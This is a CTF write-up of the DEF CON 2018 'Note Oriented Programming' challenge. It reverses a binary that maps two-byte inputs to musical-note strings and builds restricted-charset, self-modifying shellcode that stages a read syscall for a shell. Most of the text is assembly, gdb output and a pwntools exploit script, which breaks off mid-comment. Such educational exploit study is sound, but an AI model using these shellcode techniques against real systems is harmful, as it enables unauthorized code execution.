# defcon 2018 quals Note Oriented Programming

This writeup is based off of: https://ctftime.org/writeup/10040

Let's take a look at the binary (spoiler alert, this is a shellcode challenge):

```
$	file nop 
nop: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1412cfa820b6add89218f6625d632f88cf2f2998, stripped
$	pwn checksec nop 
[*] '/home/guyinatuxedo/Desktop/dc18/nop'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	./nop 
How does a shell sound?
15935728
dewdqwdq
ewdqwdq
```

So we can see that it is a `32` bit binary with RELRO, a Non Executable stack, and PIE. When we run it, it prompts us for input.

### Reversing

When we look at the main function in IDA, one of the first things we see is this:

```
  rwPtr = allocateChunk(0x1FA4);
  rxwPtr = (const char *)allocateChunk(0x1FA4);
  setupChunk(rwPtr, 0, 4000);
  setupChunk(rxwPtr, 0, 8000);
```

It essentially allocates / sets up two seperate chunks of memory, each with a static address (which we can verify via attaching gdb to the process after it starts, and using `vmmap` to look at the memory mappings). We can see that one of the memory segments which starts at `0x40405000` is `0x1000` bytes big and is `RW`, and the other which starts at `0x60608000` is `0x2000` bytes large and is `RWX`:

```
gef➤  vmmap
Start      End        Offset     Perm Path
0x40404000 0x40405000 0x00000000 rw- 

.	.	.

0x60606000 0x60608000 0x00000000 rwx 
```  

After that we run into the loop that is responsible for scanning in input:

```
  for ( *(_DWORD *)(ebp_register - 560) = 0; *(_DWORD *)(ebp_register - 560) <= 0x7CF; ++*(_DWORD *)(ebp_register - 560) )
  {
    stdinVal = stdin;
    nextWriteAdr = 2 * *(_DWORD *)(ebp_register - 560) + rwPtr;
    customFgets(0x1FA4);
    if ( !*(_WORD *)(2 * *(_DWORD *)(ebp_register - 560) + rwPtr) )
      break;
    ++*(_DWORD *)(ebp_register - 556);
  }
```

A couple of things, first IDA is having a couple of issues decompiling this code. The first thing is that a lot of the variables it is displaying at `ebp_register - 560` (so it's displaying the distance from the `ebp` register, instead of just having it be it's own seperate variable). The variable stored at the offset `- 560` represents the length of string. The second thing is with the `customFgets` function, it is not detecting it's arguments correctly. When we take a look at the assembly, we see that it has four arguments (this assembly starts at `0x985`):

```
push    eax
push    1
push    2
push    edx
call    customFgets
```

and when we take a look at the arguments in gdb, we get a better idea of what they are:

```
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcdc0│+0x0000: 0x40404000  →  0x00000000	 ← $esp
0xffffcdc4│+0x0004: 0x00000002
0xffffcdc8│+0x0008: 0x00000001
0xffffcdcc│+0x000c: 0xf7f635a0  →  0xfbad208b
0xffffcdd0│+0x0010: 0xffffcde8  →  0x00000000
0xffffcdd4│+0x0014: 0xf7fd95c5  →  "realloc"
0xffffcdd8│+0x0018: 0x00000000
0xffffcddc│+0x001c: 0xffffced4  →  0xf7db7008  →  0x00004c66 ("fL"?)
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x56555984 <main+308>       retf   0x6a50
   0x56555987 <main+311>       add    DWORD PTR [edx+0x2], ebp
   0x5655598a <main+314>       push   edx
 → 0x5655598b <main+315>       call   0x56555690
   ↳  0x56555690                  jmp    DWORD PTR [ebx+0x24]
      0x56555696                  xchg   ax, ax
      0x56555698                  jmp    DWORD PTR [ebx+0x28]
      0x5655569e                  xchg   ax, ax
      0x565556a0                  jmp    DWORD PTR [ebx+0x2c]
      0x565556a6                  xchg   ax, ax
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x56555690 (
   [sp + 0x0] = 0x40404000 → 0x00000000,
   [sp + 0x4] = 0x00000002,
   [sp + 0x8] = 0x00000001,
   [sp + 0xc] = 0xf7f635a0 → 0xfbad208b
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "nop", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5655598b → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

So here we can see that the arguments are the area of memory it's going to write (`0x40404000`, which after this function is called we can see our input ends up). The next two arguments `0x2` and `0x1` specify how much to scan in. It is probably something like `1` `2` byte quantity (so just the second times the third) that it is scanning in. This is supported by both the fact that it scans in `0x2` bytes of data normally, and when we adjust the third argument to be `0x4` instead of `0x1`, we see that we can scan in `0x8` bytes of data. For the last argument, we can see that it is just `stdin`:

```
gef➤  x/x 0xf7f635a0
0xf7f635a0 <_IO_2_1_stdin_>:	0xfbad208b
```

Looking at the rest of this loop, we can see that it just scans in up to 2000 2 byte values into the memory region pointed to by `rwPtr` (starts at `0x40405000`). However we can see that there is an early termination with the if then statement, which will terminate if our two byte input is two null bytes. We can see that in the assembly code, where the check happens at `0x9a8`:

```
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565559a1 <main+337>       add    edx, edx
   0x565559a3 <main+339>       add    eax, edx
   0x565559a5 <main+341>       movzx  eax, WORD PTR [eax]
 → 0x565559a8 <main+344>       test   ax, ax
   0x565559ab <main+347>       je     0x565559c9 <main+377>
   0x565559ad <main+349>       add    DWORD PTR [ebp-0x22c], 0x1
   0x565559b4 <main+356>       add    DWORD PTR [ebp-0x230], 0x1
   0x565559bb <main+363>       cmp    DWORD PTR [ebp-0x230], 0x7cf
   0x565559c5 <main+373>       jle    0x5655596b <main+283>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "nop", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565559a8 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  9
Undefined command: "9".  Try "help".
gef➤  p $ax
$1 = 0x3531
```

This time we can see our input (which was `15`) being compared, and that the jump that exits the loop doesn't happen (however when we set the `ax` register equal to `0x0`, the jump happens). One last thing, there are two variables that are keeping track of the length of the string divided by two (since they get incremented by one for every loop where the string gets two characters), one located at the offset `ebp - 556` and the other located at the offset `ebp - 560`. We can see both of them getting icremented at `0x9b4`:

```
   0x565559ad <main+349>       add    DWORD PTR [ebp-0x22c], 0x1
   0x565559b4 <main+356>       add    DWORD PTR [ebp-0x230], 0x1
 → 0x565559bb <main+363>       cmp    DWORD PTR [ebp-0x230], 0x7cf
```

Next up we can see that there is this function call what is essentially a `strncpy` call, to copy `20` bytes of data from `data` to `rxwPtr` (I verified this in gdb):

```
  strncpy(rxwPtr, &data, 20);
```

Next up we have this for loop:


```
  for ( *(_DWORD *)(ebp_register - 560) = 0;
        *(_DWORD *)(ebp_register - 560) < *(_DWORD *)(ebp_register - 556);
        ++*(_DWORD *)(ebp_register - 560) )
  {
    *(_WORD *)(ebp_register - 562) = *(_WORD *)(2 * *(_DWORD *)(ebp_register - 560) + rwPtr);
    if ( *(_WORD *)(ebp_register - 562) == 0xFFFFu )
      break;
    if ( *(_WORD *)(ebp_register - 562) <= 0x1Au )
    {
      putsCustom(0x1FA4);
      sub_6A8(1);
    }
    if ( *(_WORD *)(ebp_register - 562) > 0x67DEu )
    {
      putsCustom(0x1FA4);
      sub_6A8(1);
    }
    *(_DWORD *)(ebp_register - 576) = *(_WORD *)(ebp_register - 562);
    v5 = sub_6C8(v11, COERCE_UNSIGNED_INT64((long double)*(signed int *)(ebp_register - 576) / 27.5) >> 32) * 12.0 + 0.5;
    v6 = *(_WORD *)(ebp_register - 570);
    HIBYTE(v6) = 12;
    *(_WORD *)(ebp_register - 572) = v6;
    *(_DWORD *)(ebp_register - 552) = (signed int)v5;
    *(_DWORD *)(ebp_register - 548) = *(_DWORD *)(ebp_register - 552) / 12;
    *(_DWORD *)(ebp_register - 544) = *(&off_2020 + *(_DWORD *)(ebp_register - 552) % 12);
    sub_6D0(ebp_register - 540, "%s%d", *(_DWORD *)(ebp_register - 544), *(_DWORD *)(ebp_register - 548));
    sub_688(rxwPtr, ebp_register - 540);
  }
```

The loop will run x amount of times, where x is the length of the input divided by two (uses the `560` offset as an iteration counter, and the `556` for the termination condition). We can see the loop starts by moving the current two bytes of our input (this loop will loop through the first two bytes, then second two bytes, then third and onward until the loop ends). We can also see that there is an early termination condition, where if our two byte input is `0xffff` the loop ends.

```
    *(_WORD *)(ebp_register - 562) = *(_WORD *)(2 * *(_DWORD *)(ebp_register - 560) + rwPtr);
    if ( *(_WORD *)(ebp_register - 562) == 0xFFFFu )
      break;
```

Next up, we can see that it compares our current two byte input to ensure that it is both greater than `0x1a` and less than `0x67df`. If it does not meet those conditions, the code exits and prints either `too low` or `too high`:

```
    if ( *(_WORD *)(ebp_register - 562) <= 0x1Au )
    {
      putsCustom(0x1FA4);
      customExit(1);
    }
    if ( *(_WORD *)(ebp_register - 562) > 0x67DEu )
    {
      putsCustom(0x1FA4);
      customExit(1);
    }
```

Next up we can see that it moves the current two characters from the offset `562` to the offset `576`:

```
    *(_DWORD *)(ebp_register - 576) = *(_WORD *)(ebp_register - 562);
```

after that, we see this line:

```
    x = sub_6C8(v11, COERCE_UNSIGNED_INT64((long double)*(signed int *)(ebp_register - 576) / 27.5) >> 32) * 12.0 + 0.5;
```

this line of the code does a lot. Starting off, it converts our current two byte input into a double (so if our input is `0x3030 = 12336` it will push the float value equal to `12336` onto the float register stack). Proceeding that, it will divide the value by `27.5`, and run it through a function at `0xa92` that does some math to it. By stepping into the function, we can see that it is performing a log operation on it:

```
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf76a2d2a                  xchg   ax, ax
   0xf76a2d2c                  xchg   ax, ax
   0xf76a2d2e                  xchg   ax, ax
 → 0xf76a2d30 <log2+0>         push   ebx
   0xf76a2d31 <log2+1>         call   0xf768e590
   0xf76a2d36 <log2+6>         add    ebx, 0x3b2ca
   0xf76a2d3c <log2+12>        sub    esp, 0x8
   0xf76a2d3f <log2+15>        fld    QWORD PTR [esp+0x10]
   0xf76a2d43 <log2+19>        fldz   
```

Looking at the value before and after the log function call, and then trying to run our input through several different log functions with different bases, we can see that it is calculating the log base 2 of the value it is passed. It might help to look at the assembly code for this portion starting at `0xa92` to understand what is happening:

```
fild    [ebp+var_240]
fld     ds:(dbl_D20 - 1FA4h)[ebx]
fdivp   st(1), st
sub     esp, 8
lea     esp, [esp-8]
fstp    qword ptr [esp]
call    sub_6C8
```

after that, we can see that it multiplies the output of the log function by `12`, adds `.5` to it, then stores it in the variable `x` at the offset `0x23a` (`570`):

```
add     esp, 10h
fld     ds:(dbl_D28 - 1FA4h)[ebx]
fmulp   st(1), st
fld     ds:(dbl_D30 - 1FA4h)[ebx]
faddp   st(1), st
fnstcw  [ebp+var_23A]
```

Next we can see that it moves the smallest two bytes of `x` (which is at the offset `570`) into the variable `y` (which is kept in the `eax` register):

```
    y = *(_WORD *)(ebp_register - 570);
```


but then right after that, it moves `0xc` (`12`) into the second highest byte of `y`, so `y` is a two byte value with the highest being `y`, and the lowest being whatever the lowest byte of `x` was:

```
    HIBYTE(y) = 12;
```

So next we can see that it moves the value `y` into the variable at offset `572`, `x` into the variable at offset `552`, the value of the variable at offset `552` (which is the same as `x`) divided by 12 and converted into a signed int into the variable at offset `548`. The last one is a bit different. It will take the value of the variable stored at offset `552`, mod it by twelve, then add it to the array of `noteArray` (essentially uses it as an index), which is a char * array with `12` entries. It then dereferences the resulting pointer and moves the string into the variable stored at offset `544`:

```
    *(_WORD *)(ebp_register - 572) = y;
    *(_DWORD *)(ebp_register - 552) = (signed int)x;
    *(_DWORD *)(ebp_register - 548) = *(_DWORD *)(ebp_register - 552) / 12;
    *(_DWORD *)(ebp_register - 544) = *(&noteArray + *(_DWORD *)(ebp_register - 552) % 12);
```

When we take a look at all of the available strings in that char * array, we see that we are dealing with musical notes:

```
gef➤  x/s 0x56555c88
0x56555c88: "A"
gef➤  x/s 0x56555c8a
0x56555c8a: "A#"
gef➤  x/s 0x56555c8d
0x56555c8d: "B"
gef➤  x/s 0x56555c8f
0x56555c8f: "C"
gef➤  x/s 0x56555c91
0x56555c91: "C#"
gef➤  x/s 0x56555c94
0x56555c94: "D"
gef➤  x/s 0x56555c96
0x56555c96: "D#"
gef➤  x/s 0x56555c99
0x56555c99: "E"
gef➤  x/s 0x56555c9b
0x56555c9b: "F"
gef➤  x/s 0x56555c9d
0x56555c9d: "F#"
gef➤  x/s 0x56555ca0
0x56555ca0: "G"
gef➤  x/s 0x56555ca2
0x56555ca2: "G#"
```

Also another thing to note, the max value of the variable stored at offset `548` is `9`. This is because we can't input a value greater than `0x67de`, and when we run that through the algorithm we get `9`.  After that we see a function that will move the contents of the variables stored at `544` and `548` into the variable stored at offset `540`. When it does this, the signed integer will be converted to it's ascii form, so `8` will become `0x38`:

```
    moveData(ebp_register - 540, "%s%d", *(_DWORD *)(ebp_register - 544), *(_DWORD *)(ebp_register - 548));
```

Then finally on the last line for this for loop, which will append those two bytes to the end of the data pointed to by `rwxPtr` (starts at`0x60608000`). This is where our shellcode ends up:

```
    appenData(rxwPtr, ebp_register - 540);
``` 

After that for loop is over, we see that the code will append a `int 80` instruction to the end of our shellcode (opcodes `0x80cd`), then run the muscial note shellcode:

```
  shellcodeLen = &rxwPtr[strlen(rxwPtr)];
  *(_WORD *)shellcodeLen = 0x80CDu;
  *((_BYTE *)shellcodeLen + 2) = 0;
  setupChunk(ebp_register - 540, 79, 512);
  strncpy(ebp_register - 540 + 64, "---- Welcome to Note Oriented Programming!! ----", 48);
  ((void (*)(void))rxwPtr)();
```

So just to do a quick recap, it scans in input in two byte blocks. It checks to make sure their value is within a certain range, then does some math on them to come up with with one of 12 1-2 character strings (all musical notes) and a number between 0-1. It will then take those two things, append it to the end of shellcode, and run it. 

### Exploit

Looking through the list of opcodes that we have available (I just used the next step to send every opcode to see what we have) we can see that we have access to some of the `inc`, `xor`, `and`, `cmp` and a few other instructions. The first step we have is to figure out how to send sepecific inputs to get specific opcodes. For this I just whipped up a quick python script that would print a dictionary, mapping desired opcodes with one of their corresponding inputs:

```
  1 from math import *
  2 
  3 noteChars = ["A", "A#", "B", "C", "C#", "D", "D#", "E", "F", "F#", "G", "G#"]
  4 validBytes = {}
  5 
  6 def runMath(inp):
  7         x = float(inp) / 27.5
  8         x = log(x, 2)
  9         x = x * 12
 10         x = x + .5
 11         return x
 12 
 13 def reverseBits(x):
 14         y = x & 0xff
 15         z = x & 0xff00
 16         y = y << 8
 17         z = z >> 8
 18         x = y | z
 19         return x
 20 
 21 for i in noteChars:
 22         for j in xrange(10):
 23                 validBytes[i + str(j)] = ''
 24 
 25 for i in xrange(0xffff):
 26         x = reverseBits(i)
 27         if x > 0x67de or x <= 0x1a:
 28                 continue 
 29         x = runMath(x)
 30         y = int(x) / 12
 31         z = noteChars[int(x) % 12]
 32         out =  z + str(y)       
 33         if validBytes[out] == '':
 34                 validBytes[out] = hex(i)
 35                 
 36 print validBytes
```

The binary puts this shellcode before our own:

```
   0x60606000: add    esp,0x30
   0x60606003:  xor    eax,eax
   0x60606005:  xor    ebx,ebx
   0x60606007:  xor    ecx,ecx
   0x60606009:  xor    edx,edx
   0x6060600b:  xor    edi,edi
   0x6060600d:  xor    esi,esi
   0x6060600f:  mov    edi,esp
   0x60606011:  mov    esi,esp
   0x60606013:  nop
```

and the status of all of the registers when our shellcode finally runs:
```
$eax   : 0x0       
$ebx   : 0x0       
$ecx   : 0x0       
$edx   : 0x0       
$esp   : 0xff954cbc  →  "OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO[...]"
$ebp   : 0xff954ed8  →  0x00000000
$esi   : 0xff954cbc  →  "OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO[...]"
$edi   : 0xff954cbc  →  "OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO[...]"
$eip   : 0x60606014  →  "A3F0A1G0G6G6G6G1G0G6G6G6G1G0G6G6G6G1G0G6G6G6G1G0A3[...]"
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
```

Now to build our shellcode. This portion of the writeup comes from the writeup that this is based off. The plan is to send shellcode that will give us a read syscall, which we will then scan in shellcode without the note restriction that will actually give us a shell. For that we need the `eax` register to have the value `3`, the `edx` register will need the amount of bytes to read, and the `ecx` register will need to have a pointer to where we are scanning in data. In addition to that we will need `ebx` to be set equal to `0x0` to specify that we are reading in through `stdin`. Since we have several pointers in registers that point to the stack (`esp`, `esi`, `edi`) what we can do is use our limited instructions to write to the stack, to setup a stack for a `popad` call, which will pop the values off of the stack into 7 different registers including the ones we need. To have the `popad` call (since it's opcode isn't allowed), we will change the value of the `eax` register to point to somewhere further down in the rwx segment that is being executed, and write to it's dereferenced value to essentially just write in the instruction while it's running.

Starting off, we will xor the `eax` register by `0x4f4f4f4f`. When `esp` get's increased by `0x30` it points to a string which starts with a lot of `O`s, and get's moved into the `esi` register. We will just xor `eax` by `esi+0x30` which will set `eax` equal to `0x4f4f4f4f`: 

```
; A3 F0
inc ecx ; A
xor    eax, DWORD PTR [esi+0x30] ; 3F0
```

Next we will clear out some space in the string pointed to by `esp`, `esi`, and `edi`. We can do this by just xoring the dereferenced value of `edi+0x30` with `eax`, and then incrementing the `edi` register by four in between xors. This will allow us to clear out space in the string with the opcode restriction, which we will use to setup the `popad` call (5 four byte segments, one for each register and one to make a pointer). Also for the fifth write, we will xor over four `0x2d` so we will end up with `0x62` which we will use for the address of the `read` syscall:
```
; A1 G0 first xor
inc ecx ; A
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 second xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 third xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 fourth xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 fifth xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0
```

Next we will clear out the `eax` register, by xoring it with the value pointed to by `esi+0x23` (which is `O`). Since then the value of eax will be zero, we will write `2` to it by xoring it by `0x41`, then `0x43` since `0x41 ^ 0x43 = 0x2`: 

```
; A3 F#6 A4 A6 A4 C6 A (Last A is borrowed from next step)
inc    ecx ; A
xor    eax, DWORD PTR [esi+0x23] ; 3F#
ss inc ecx ; 6A
xor    al,0x41 ;  4A
ss inc ecx ; 6A
xor    al,0x43 ; 4C
ss inc ecx ; 6A
```

Next we will xor the first, third, and fourth bytes of the `0x62626262` value with that of `0x2` (stored in the `eax` register). This will leave us with `0x60606260`:

```
; 0 G0 A0 G2 A0 G3
xor    BYTE PTR [edi+0x30], al ; 0G0
inc    ecx ; A
xor    BYTE PTR [edi+0x32], al ; 0G2
inc    ecx ; A
xor    BYTE PTR [edi+0x33], al ; 0G3
```

Next we will write the value `3` into the eax register, and xor it with second byte of the `0x60606260` stack value, leaving us with `0x60606160`:

```
; A4 B4 C6 A0 G1
inc    ecx ; A
xor    al, 0x42 ; 4B
xor    al, 0x43 ; 4C
ss     inc ecx ; 6A
xor    BYTE PTR [edi+0x31], al ; 0G1
```

Next we will clear out `eax` register by xoring it with `0x41` then `0x42` since `0x3 ^ 0x41 = 0x42` and `0x42 ^ 0x42 = 0x0`:

```
; A4 A4 B6 A3 (3 is used in next step)
inc    ecx ; A
xor    al, 0x41 ; 4A
xor    al, 0x42 ; 4B
ss     inc ecx ; 6A
```

Now we will move the rwx pointer we've been making (`0x60606160`) into the `eax` register. After that we will start clearing out the `edi` register by xoring it with the opcodes stored in `0x60606160`, which are `0x41364136`:

```
; 3 G0 A#8 
xor    eax, DWORD PTR [edi+0x30] ; 3G0
inc    ecx ; A
and    edi, DWORD PTR [eax] ; #8
```

Now we will finish clearing out the `edi` register. We will essentially change the `eax` pointer to `0x60606161`. Then we will again xor `edi` by the value pointed to by `eax`, which will give us `0x41364136 & 0x36413641 = 0x0`:

```
; A4 B4 C6 A#8
inc    ecx ; A
xor    al,0x42 ; 4B
xor    al,0x43 ; 4C
ss inc ecx ; 6A
and    edi,DWORD PTR [eax] ; #8
```

Now we will write the `popad` instruction to our shellcode. With our setup the last byte of the `eax` register is `0x61`, which is the opcode for the `popad`. However since our write is with an xor, and we've filled the space around our pointer in `eax` with `0x3641` opcodes we will have to find xor it by `0x41 ^ 0x61 = 0x20`. So we will need to xor `al` by `0x41` to get it there:

```
; A4 A6 A0 D8 A6 (6 is used in next step)
inc    ecx ; A
xor    al,0x41 ; 4A
ss inc ecx ; 6A
xor    BYTE PTR [eax+edi*1+0x41],al ; 0D8A
```

Now that the `popad` instruction has been written, we just need to worry about setting up the stack for the `popad` instruction. For this we will prep the `edx` (how many bytes) and `ecx` (where to write) both to be the pointer in `eax`. This might be a bit overkill for the size limit, however we won't run out of bytes to write. Also this will ensure that our second wave of shellcode is in the static `rwx` region of memory that our shellcode executes in. For this step, we are using some of the space we cleared up in the beginning:

```
; 6 F6 F6 F6 F1 F0 F6 F6 F6 F1 F0
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
xor    DWORD PTR [esi+0x30],eax ; 1F0

inc    esi ; F
ss inc esi ; 6F
ss inc esi ; 6F
ss inc esi ; 6F
xor    DWORD PTR [esi+0x30],eax ; 1F0
```

Now we will have to write the value of `0x3` to it's designated stack position. Before we do that, we will have to xor `eax` by a value it is equal to (which we just wrote it), followed by two values that will give us `0x3`:

```
; A3 F0 A4 A4 B6 (6 is used in next step)
inc    ecx ; A
xor    eax,DWORD PTR [esi+0x30] ; 3F0
inc    ecx ; A
xor    al,0x41 ; 4A
xor    al,0x42 ; 4B
```

Now that `eax` is equal to `0x3`, we can prep the `eax` value for the `popad` instruction:

```
; 6 F6 F6 F6 F1 F0
ss     inc esi ; 6F
ss     inc esi ; 6F
ss     inc esi ; 6F
ss     inc esi ; 6F
xor    DWORD PTR [esi+0x30], eax ; 1F0
```

Now the stack setup that we have for the `popad` instruction is currently `0x20` bytes above the current `esp` value. We will need to increment `esp` 32 times to move the stack into our stack setup for `popad`:

```
; D6 * 32
inc    esp  
ss inc esp 
```

After that is done, this is how the stack will look. Keep in mind that with a `popad` instruction, the order that registers are filled from the stack is `edi`, `esi`, `ebp`, `esp` (`esp` is set equal to `esp + 4` and the four bytes are skipped), `ebx`, `edx`, `ecx`, and `eax`:

```
───────────────────────────────────────────────────────────────────── stack ────
0xffba96ec│+0x0000: "OOOOOOOOOOOOOOOO"   ← $esp
0xffba96f0│+0x0004: "OOOOOOOOOOOO"
0xffba96f4│+0x0008: "OOOOOOOO"
0xffba96f8│+0x000c: "OOOO"
0xffba96fc│+0x0010: 0x00000000
0xffba9700│+0x0014: 0x60606120  →  "6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A[...]"
0xffba9704│+0x0018: 0x60606120  →  "6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A[...]"
0xffba9708│+0x001c: 0x00000003
─────────────────────────────────────────────────────────────── code:x86:32 ────
```

Now for the last thing we will add. We will just send a bunch of copies of the same instruction. The `edi` clearing we did earlier relies on the first opcode when anded by the second, being equal to `0x0`. Now even with these increments to the `ecx` register (some are negated by the `popad` call, but not all) we will still be scanning in input before the `int 0x80` call. To counter this we can just create a giant nop sled that goes past the `int 0x80` instruction (we have the space):

```
; A6
ss inc ecx ; A6 (400 times)
```

After that we can just send the secondary shellcode, and we will have a shell. Putting it all together, we get the following exploit:
```
# This exploit is originally from (and based off of): https://ctftime.org/writeup/10040

from pwn import *

target = process("./nop")
gdb.attach(target, gdbscript = 'entry-break')

opcodes = {'G#1': '0x6500', 'G#0': '0x3300', 'G#3': '0x9401', 'G#2': '0xca00', 'G#5': '0x4e06', 'G#4': '0x2703', 'G#7': '0x1a', 'G#6': '0xd', 'G#9': '0x65', 'G#8': '0x33', 'G7': '0x18', 'G6': '0xc', 'G5': '0x6', 'G4': '0x3', 'G3': '0x7d01', 'G2': '0xbf00', 'G1': '0x6000', 'G0': '0x3000', 'G9': '0x60', 'G8': '0x30', 'D#8': '0x26', 'D#9': '0x4c', 'D#6': '0xa', 'A8': '0x1b', 'B4': '0xe001', 'B5': '0xc003', 'B6': '0x8007', 'B7': '0xf', 'B0': '0x1e00', 'B1': '0x3c00', 'B2': '0x7800', 'B3': '0xf000', 'B8': '0x1e', 'B9': '0x3c', 'F#0': '0x2d00', 'F#1': '0x5a00', 'F#2': '0xb400', 'F#3': '0x6801', 'F#4': '0xcf02', 'F#5': '0x9e05', 'F#6': '0x3c0b', 'F#7': '0x17', 'F#8': '0x2d', 'F#9': '0x5a', 'E9': '0x51', 'E8': '0x29', 'E5': '0x105', 'E4': '0x8102', 'E7': '0x15', 'E6': '0x20a', 'E1': '0x5100', 'E0': '0x2900', 'E3': '0x4101', 'E2': '0xa100', 'A#3': '0xe300', 'A#2': '0x7200', 'A#1': '0x3900', 'A#0': '0x1d00', 'A#7': '0x280e', 'A#6': '0x1407', 'A#5': '0x8a03', 'A#4': '0xc501', 'A#9': '0x39', 'A#8': '0x1d', 'C9': '0x40', 'C8': '0x20', 'C3': '0x1', 'C2': '0x8000', 'C1': '0x4000', 'C0': '0x2000', 'C7': '0x10', 'C6': '0x8', 'C5': '0x4', 'C4': '0x2', 'F0': '0x2b00', 'F1': '0x5500', 'F2': '0xaa00', 'F3': '0x5401', 'F4': '0xa702', 'F5': '0x4e05', 'F6': '0xb', 'F7': '0x16', 'F8': '0x2b', 'F9': '0x55', 'A1': '0x3600', 'A0': '0x1b00', 'A3': '0xd600', 'A2': '0x6b00', 'A5': '0x5703', 'A4': '0xac01', 'A7': '0xe', 'A6': '0x7', 'A9': '0x36', 'D#7': '0x13', 'D#4': '0x5d02', 'D#5': '0x5', 'D#2': '0x9800', 'D#3': '0x2f01', 'D#0': '0x2600', 'D#1': '0x4c00', 'C#9': '0x44', 'C#8': '0x22', 'C#5': '0x3604', 'C#4': '0x1b02', 'C#7': '0x11', 'C#6': '0x6b08', 'C#1': '0x4400', 'C#0': '0x2200', 'C#3': '0xe01', 'C#2': '0x8700', 'D8': '0x24', 'D9': '0x48', 'D6': '0x9', 'D7': '0x12', 'D4': '0x3b02', 'D5': '0x7604', 'D2': '0x8f00', 'D3': '0x1e01', 'D0': '0x2400', 'D1': '0x4800'}

def prepNoteString(x):
  x = int(x, 16)
  y = x & 0xff
  z = x & 0xff00
  z = z >> 8
  x = chr(z) + chr(y)
  return x

def clearStackSpot():
  loopSend("G6", 3)
  send("G1")
  send("G0")

def writePopaStackValue():
  send("F6")
  send("F6")
  send("F6")
  send("F1")
  send("F0")


def send(op):
  target.send(prepNoteString(opcodes[op]))

def loopSend(op, qt):
  for i in xrange(qt):
    target.send(prepNoteString(opcodes[op]))

'''
inc ecx ; A
xor    eax, DWORD PTR [esi+0x30] ; 3F0
'''
send("A3")
send("F0")



'''
; A1 G0 first xor
inc ecx ; A
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 second xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 third xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 fourth xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0

; G6 G6 G6 G1 G0 fifth xor write
inc edi ; G
ss inc edi ; 6G
ss inc edi ; 6G
ss inc edi ; 6G
xor    DWORD PTR [edi+0x30],eax ; 1G0
'''
send("A1")
send("G0")
clearStackSpot()
clearStackSpot()
clearStackSpot()
clearStackSpot()


'''
; A3 F#6 A4 A6 A4 C6 A (Last A is borrowed from next step)
inc    ecx ; A
xor    eax, DWORD PTR [esi+0x23] ; 3F#
ss inc ecx ; 6A
xor    al,0x41 ;  4A
ss inc ecx ; 6A
xor    al,0x43 ; 4C
ss inc ecx ; 6A
'''
send("A3")
send("F#6")
send("A4")
send("A6")
send("A4")
send("C6")
send("A0")



'''
; 0 G0 A0 G2 A0 G3
xor    BYTE PTR [edi+0x30], al ; 0G0
inc    ecx ; A
xor    BYTE PTR [edi+0x32], al ; 0G2
inc    ecx ; A
xor    BYTE PTR [edi+0x33], al ; 0G3
'''
send("G0")
send("A0")
send("G2")
send("A0")
send("G3")



'''
; A4 B4 C6 A0 G1
inc    ecx ; A
xor    al, 0x42 ; 4B
xor    al, 0x43 ; 4C
ss     inc ecx ; 6A
xor    BYTE PTR [edi+0x31], al ; 0G1
'''
send("A4")
send("B4")
send("C6")
send("A0")
send("G1")


'''
; A4 A4 B6 A3 (3 is used in next step)
inc    ecx ; A
xor    al, 0x41 ; 4A
xor    al, 0x42 ; 4B
ss     inc ecx ; 6A
'''
send("A4")
send("A4")
send("B6")
send("A3")



'''
; 3 G0 A#8 
xor    eax, DWORD PTR [edi+0x30] ; 3G0
inc    ecx ; A
and    edi, DWORD PTR [eax] ; #8
'''
send("G0")
send("A#8")



'''
; A4 B4 C6 A#8
inc    ecx ; A
xor    al,0x42 ; 4B
